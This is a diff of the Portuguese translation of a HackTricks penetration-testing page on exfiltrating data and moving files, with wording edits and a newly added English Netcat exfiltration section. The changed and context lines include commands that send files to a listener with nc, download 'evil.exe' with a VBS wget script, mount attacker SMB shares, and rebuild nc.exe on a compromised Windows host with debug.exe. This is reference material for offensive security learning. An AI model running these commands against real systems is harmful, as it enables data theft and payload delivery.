@@ -16,13 +16,13 @@ Outras maneiras de apoiar o HackTricks:
 
 <figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-Encontre vulnerabilidades que mais importam para que você possa corrigi-las mais rapidamente. O Intruder rastreia sua superfície de ataque, executa varreduras proativas de ameaças, encontra problemas em toda a sua pilha tecnológica, de APIs a aplicativos da web e sistemas em nuvem. [**Experimente de graça**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.
+Encontre vulnerabilidades que mais importam para que você possa corrigi-las mais rapidamente. O Intruder rastreia sua superfície de ataque, executa varreduras proativas de ameaças, encontra problemas em toda a sua pilha tecnológica, desde APIs até aplicativos da web e sistemas em nuvem. [**Experimente de graça**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.
 
 {% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
 
 ***
 
-## Domínios comumente permitidos para exfiltração de informações
+## Domínios comumente permitidos para exfiltrar informações
 
 Verifique [https://lots-project.com/](https://lots-project.com/) para encontrar domínios comumente permitidos que podem ser abusados
 
@@ -62,7 +62,7 @@ Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
-### Enviar arquivos
+### Upload de arquivos
 
 * [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
 * [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
@@ -150,7 +150,7 @@ mkdir -p /ftphome
 chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
-### **Cliente Windows**
+### **Cliente** Windows
 ```bash
 #Work well with python. With pure-ftp use fusr:ftp
 echo open 10.11.0.41 21 > ftp.txt
@@ -193,57 +193,21 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
-Windows
+### Exfiltração do Windows
 
-## Exfiltration
+Existem várias maneiras de exfiltrar dados de um sistema Windows comprometido. Alguns métodos comuns incluem:
 
-### Overview
+1. **Utilização de Protocolos de Rede**: Os invasores podem usar protocolos de rede como HTTP, HTTPS, DNS, ou até mesmo ICMP para enviar dados para fora da rede comprometida.
 
-Exfiltration is the unauthorized transfer of data from a target system. This can be achieved through various methods, such as:
+2. **Uso de Serviços Legítimos**: Os invasores podem abusar de serviços legítimos do Windows, como PowerShell, PsExec, ou até mesmo o Windows Management Instrumentation (WMI) para exfiltrar dados.
 
-- Uploading data to an external server
-- Sending data via email
-- Using cloud storage services
-- Hiding data in images or other files
-- Encrypting data before exfiltration
+3. **Armazenamento em Arquivos**: Os invasores podem armazenar dados em arquivos comprimidos ou criptografados e transferi-los para fora do sistema comprometido.
 
-### Techniques
+4. **Técnicas de Esteganografia**: A esteganografia pode ser usada para ocultar dados exfiltrados em arquivos de imagem, áudio ou vídeo.
 
-#### Data Compression
+5. **Túneis de Comunicação**: Os invasores podem criar túneis de comunicação para enviar dados exfiltrados por meio de portas não padrão ou protocolos não convencionais.
 
-Data can be compressed before exfiltration to reduce its size and make it easier to transfer without raising suspicion.
-
-#### Data Encryption
-
-Encrypting data before exfiltration can help protect it from being intercepted or tampered with during transit.
-
-#### Steganography
-
-Steganography involves hiding data within other files, such as images, to avoid detection.
-
-#### DNS Tunneling
-
-DNS tunneling can be used to exfiltrate data by encoding it within DNS queries and responses.
-
-#### Remote Access Tools
-
-Remote access tools can be used to remotely access a target system and exfiltrate data.
-
-### Tools
-
-- **WinRAR**: A file compression tool that can be used to compress data before exfiltration.
-- **VeraCrypt**: A tool for encrypting data before exfiltration to enhance security.
-- **OpenStego**: A steganography tool for hiding data within other files.
-- **Iodine**: A tool for DNS tunneling to exfiltrate data covertly.
-- **Netcat**: A versatile networking tool that can be used for exfiltration.
-- **Meterpreter**: A post-exploitation tool that can be used for exfiltration in a compromised system.
-
-### Best Practices
-
-- Use encryption to protect exfiltrated data.
-- Employ data compression to reduce transfer times.
-- Use multiple exfiltration methods to avoid detection.
-- Regularly monitor outbound network traffic for suspicious activity.
+É importante estar ciente dessas técnicas de exfiltração para proteger efetivamente os sistemas Windows contra atividades maliciosas.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -266,6 +230,32 @@ sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
 ## NC
+
+### Exfiltration
+
+#### Description
+
+Netcat (nc) is a versatile networking tool that can be used for exfiltration. It can create a connection between two systems, allowing data to be transferred between them. Netcat can be used to exfiltrate data over various protocols such as TCP or UDP.
+
+#### Usage
+
+To exfiltrate data using Netcat, you can set up a listener on the receiving end and a client on the sending end. Here is an example of how to exfiltrate a file using Netcat:
+
+On the receiving end:
+```bash
+nc -lvp <PORT> > received_file
+```
+
+On the sending end:
+```bash
+nc <RECEIVING_IP> <PORT> < file_to_send
+```
+
+Replace `<PORT>` with the desired port number, `<RECEIVING_IP>` with the IP address of the receiving system, and `file_to_send` with the name of the file you want to exfiltrate.
+
+#### Detection
+
+Detecting exfiltration via Netcat can be challenging as it can blend in with legitimate network traffic. Monitoring network traffic for suspicious connections or unusual data transfers can help in detecting unauthorized exfiltration activities. Conducting regular network traffic analysis and monitoring for anomalies can aid in the early detection of data exfiltration using tools like Netcat.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -374,39 +364,37 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Esta é uma técnica maluca que funciona em máquinas Windows de 32 bits. A ideia é usar o programa `debug.exe`. Ele é usado para inspecionar binários, como um depurador. Mas também pode reconstruí-los a partir de hex. Então a ideia é pegar binários, como `netcat`. E então desmontá-lo em hex, colá-lo em um arquivo na máquina comprometida e depois montá-lo com `debug.exe`.
-
-`Debug.exe` só pode montar 64 kb. Então precisamos usar arquivos menores que isso. Podemos usar o upx para comprimi-lo ainda mais. Então vamos fazer isso:
-```
+O programa `debug.exe` não só permite a inspeção de binários, mas também tem a **capacidade de reconstruí-los a partir de hex**. Isso significa que, fornecendo um hex de um binário, o `debug.exe` pode gerar o arquivo binário. No entanto, é importante observar que o debug.exe tem uma **limitação de montagem de arquivos de até 64 kb de tamanho**.
+```bash
+# Reduce the size
 upx -9 nc.exe
-```
-Agora ele pesa apenas 29 kb. Perfeito. Então agora vamos desmontá-lo:
-```
 wine exe2bat.exe nc.exe nc.txt
 ```
+Em seguida, copie e cole o texto no windows-shell e um arquivo chamado nc.exe será criado.
+
+* [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
+
 ## DNS
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
 <figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-Agora basta copiar e colar o texto em nosso shell do Windows. E ele automaticamente criará um arquivo chamado nc.exe
-
-Encontre vulnerabilidades que mais importam para que você possa corrigi-las mais rapidamente. O Intruder rastreia sua superfície de ataque, executa varreduras proativas de ameaças, encontra problemas em toda a sua pilha tecnológica, desde APIs até aplicativos da web e sistemas em nuvem. [**Experimente de graça**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.
+Encontre vulnerabilidades que mais importam para que você possa corrigi-las mais rapidamente. O Intruder rastreia sua superfície de ataque, executa varreduras proativas de ameaças, encontra problemas em toda a sua pilha tecnológica, desde APIs até aplicativos da web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.
 
 {% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
 
 
 <details>
 
-<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Aprenda hacking na AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Outras maneiras de apoiar o HackTricks:
 
-* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Obtenha o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
+* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
+* **Compartilhe seus truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
